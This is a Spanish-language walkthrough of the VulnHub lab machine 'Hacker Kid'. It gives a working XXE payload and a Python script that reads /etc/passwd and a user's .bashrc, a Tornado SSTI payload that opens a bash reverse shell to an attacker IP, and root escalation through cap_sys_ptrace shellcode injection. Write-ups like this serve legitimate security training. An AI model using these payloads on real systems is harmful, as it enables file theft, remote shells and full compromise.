---
layout: single
title: Hacker Kid - VulnHub
excerpt: " Difficulty: Easy/Medium (Intermediate) This box is OSCP style and focused on enumeration with easy exploitation.The goal is to get root.No guessing or heavy bruteforce is required and proper hints are given at each step to move ahead."
date: 2023-03-09
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-hackerkid/hackerkid.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - XXE
  - SSTI
  - Shellcode
  - Python
  - Tornado
---

Difficulty: Easy/Medium (Intermediate)
This box is OSCP style and focused on enumeration with easy exploitation.The goal is to get root.No guessing or heavy bruteforce is required and proper hints are given at each step to move ahead.

# Summary
- IP: 192.168.0.106
- Ports: 53,80,9999
- OS: Linux (Ubuntu)
- Services & Applications:
	-  53 -> domain  ISC BIND 9.16.1
	-  80 -> Apache httpd 2.4.41
	-  9999 -> Tornado httpd 6.1
<br><br>
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.106 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p53,80,9999 -sCV 192.168.0.106 -oN targeted
```


<br><br>

# Análisis de página web (Port 9999):

- Según la fase de reconocimiento, este puerto está corriendo por detrás un `Python Tornado`, accedemos a la página principal y vemos un login, por lo que necesitaremos credenciales válidas para entrar, así que seguimos enumerando la máquina.

<br><br>
# Análisis de página web (Port 80):


- En la página principal, si analizamos el código fuente encontramos la siguiente linea:

```js
TO DO: Use a GET parameter page_no  to view pages.
```

- Probamos la existencia de este supuesto parámetro `"page_no"` en el link:

```
http://192.168.0.106/?page_no=1
```

- Y efectivamente nos manda a la misma página pero con un texto añadido diferente; si probamos con "page_no=2" nos muestra exactamente lo mismo, así que `fuzzeamos` en busca de una respuesta diferente:

```bash
$wfuzz -c -z range,1-1000 -u http://192.168.0.106/?page_no=FUZZ -t 200 --hh=3654
```

```js
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000021:   200        116 L    310 W      3849 Ch     "21"          
```

- Como vemos, el valor "21" devuelve una respuesta distinta, así que accedemos para examinar su contenido:

```
http://192.168.0.106/?page_no=21
```

- Encontramos el siguiente texto:

```js
Okay so you want me to speak something ?
I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!
Out of my many homes...one such home..one such home for me : hackers.blackhat.local
```

- Nos filtra un `dominio` nuevo, los añadimos (tanto el dominio como el subdominio) al "/etc/hosts" y accedemos.

- Al acceder al dominio vemos el mismo contenido de la página inicial, sin embargo lo podemos usar para aprovecharnos que el puerto 53 está abierto y hacer un `ataque de transferencia de zona` y encontrar subdominios desconocidos hasta el momento:

```bash
$dig axfr @192.168.0.106 blackhat.local
```

```js
<<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr @192.168.0.106 blackhat.local
; (1 server found)
;; global options: +cmd
blackhat.local.		10800	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.		10800	IN	NS	ns1.blackhat.local.
```


- Encontramos un nuevo `subdominio`, lo añadimos al "/etc/hosts" y accdemos.

<br><br>
# Ataque XXE (XML External Entity) + Python Scripting:

- Vemos una página de registro, si llenamos con datos aleatorios y hacer click en el botón "register" podemos observar que en el output se nos muestra lo que escribimos en el campo de `"email"`, esto nos hace pensar en varios ataques, pero para confirmar interceptaremos la petición que se hace al registrar los datos con Burpsuite.

- Mandamos la petición al repeater y podemos observar en la data una estructura `XML`, lo que nos confirma un posible `XXE`, así que procedemos a inyectar los comandos para crear una entidad XML que lea el archivo "/etc/passwd" el cual vamos a mostrar en el campo de "email", quedando la estructura de la siguiente forma:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd" > ]>
<root>
	<name>test</name>
	<tel>test</tel>
	<email>&xxe;</email>
	<password>test</password>
</root>
```

- Al enviar la petición podemos ver como efectivamente se nos muestra el contenido del "/etc/passwd" de la máquina; con esto ya podríamos hacer una búsqueda de ficheros locales del sistema para encontrar posible información que nos sea útil, sin embargo para agilizar este proceso y hacerlo más cómodo desde la terminal, nos crearemos una script en `python`:

```bash
$nano exploitXXE.py
```

```python
#!/usr/bin/python3
import sys, requests

print(f"Uso: {sys.argv[0]} Nombre del fichero (Tambien se aceptan Wrappers)")
file = sys.argv[1]

target = "http://hackerkid.blackhat.local/process.php" 
xml = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{file}" > ]><root><name>test</name><tel>test</tel><email>&xxe;</email><password>test</password></root>'

request=requests.post(target,data=xml)
print(request.text)
```

- Con la script creada, enumeramos `usuarios` de la máquina víctima:

```bash
$python3 exploitXXE.py /etc/passwd | grep "sh$"
```

```js
root:x:0:0:root:/root:/bin/bash
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
```

- Vemos al usuario `"saket"`, verificamos su archivo ".bashrc" en búsqueda de información útil:

```bash
$python3 exploitXXE.py /home/saket/.bashrc
```

- No nos muestra nada, intentamos con el `Wrapper` para codificar el archivo en base64:

```bash
$python3 exploitXXE.py php://filter/convert.base64-encode/resource=/home/saket/.bashrc
```

- Y sí que nos muestra el contenido en base64, lo decodeamos y analizamos el archivo:

```bash
$echo -n "contenido en base64" l base64 -d; echo
```

- Al final del contenido podemos ver una posible contraseña.

<br><br>
# SSTI (Python - Tornado):

- Recordemos el login de la página que encontramos verificando el puerto 9999, probamos entrar como el usuario "saket" y la contraseña que encontramos.

- Al acceder podemos ver el siguiente texto:

```js
Tell me your name buddy

How can i get to know who are you ??
```


- Probamos usando el parámetro "name" en la URL y poniéndole como valor cualquier cosa:

```
http://192.168.0.106:9999/?name=Test
```

- Podemos observar que el valor que le pasamos con el parámetro "name" se nos refleja en el output; recordemos que por detrás de este puerto está corriendo un `Python Tornado`, buscamos vulnerabilidades para esto y encontramos un SSTI [SSTI (Server Side Template Injection) - Tornado Python](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python) 

- Verificamos que es vulnerable:

```
http://192.168.0.106:9999/?name={{7*7}}
```

- Y ahora lo que resta por hacer es mandarnos una `reverse shell`:

```
http://192.168.0.106:9999/?name={\%%20import%20os%20%}{\{os.system(\%27bash -c "bash -i >%26 /dev/tcp/192.168.0.145/443 0>%261"%27)}}
```


- Habremos accedido al sistema como el usuario `"saket"`.

<br><br>

# Escalando privilegios:


#### Nota: Podemos ver varios vectores para escalar privilegios, sin embargo aquí se eligió el más "complejo".


- Si enumeramos `capabilities` vemos que el comando "getcap" no funciona y nos tira este mensaje:

```js
Command 'getcap' is available in the following places
 * /sbin/getcap
 * /usr/sbin/getcap
```

- Así que editamos el `PATH` para que use la ruta /sbin:

```bash
$export PATH=/sbin:$PATH
```

- Y ahora sí funcionará el comando "getcap":

```bash
$getcap -r / 2>/dev/null
```


```js
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```


- Nos aprovecharemos en este caso de la capabilitie abjudicada a `python2.7`, la cual es "cap_sys_ptrace+ep", si consultamos a ChatGPT en que consiste esta capabilitie obtenemos lo siguiente:

```js
La capacidad "cap_sys_ptrace" es una capacidad del kernel de Linux que permite a un proceso depurar y trazar otros procesos en el sistema. Con esta capacidad, un proceso puede acceder a la memoria, registros y otros recursos de otro proceso en el sistema, lo que puede ser útil para la depuración y el análisis de programas.
```

- Así que podemos hacer trazas de ciertos programas usando python, esto suena interesante; si buscamos vulnerabilidades para esto encontramos lo siguiente: [Linux Capabilities - Cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace)

- Vemos que hay una forma de inyectar una `shellcode` con python para que por bajo nivel nos abra el puerto `5600` y podamos acceder a este con netcat desde nuestra máquina atacante.

- Copiamos el código y lo pegamos en un archivo "pwned.py"

- Al ejecutarlo nos pide como argumendo un `"PID"`, en este caso, buscamos algún programa que se esté ejecutando como root:

```bash
$ps faux | grep "root"
```

- Encontramos el servicio de apache que está ejecutado por root, copiamos su PID y lo ejecutamos con la script "pwned":

```bash
$python2.7 pwned.py 1057
```

```js
Instruction Pointer: 0x7fda48f770daL
Injecting Shellcode at: 0x7fda48f770daL
Shellcode Injected!!
Final Instruction Pointer: 0x7fda48f770dcL
```

- Ahora si nos conectamos con Netcat desde nuestra máquina atacante apuntando al puerto 5600 de la máquina víctima veremos como se establece la conexión y seremos `root`.

```bash
$nc 192.168.0.106 5600
```
